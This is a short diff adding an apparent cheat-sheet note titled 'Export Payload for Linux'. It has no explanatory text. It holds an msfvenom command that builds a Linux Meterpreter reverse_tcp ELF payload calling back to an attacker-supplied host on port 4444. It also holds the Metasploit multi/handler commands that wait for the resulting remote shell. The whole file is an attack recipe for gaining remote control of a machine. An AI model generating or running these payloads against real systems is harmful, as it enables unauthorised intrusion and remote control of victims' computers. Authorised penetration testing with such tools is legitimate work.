@@ -1,0 +1,5 @@
+Export Payload for Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
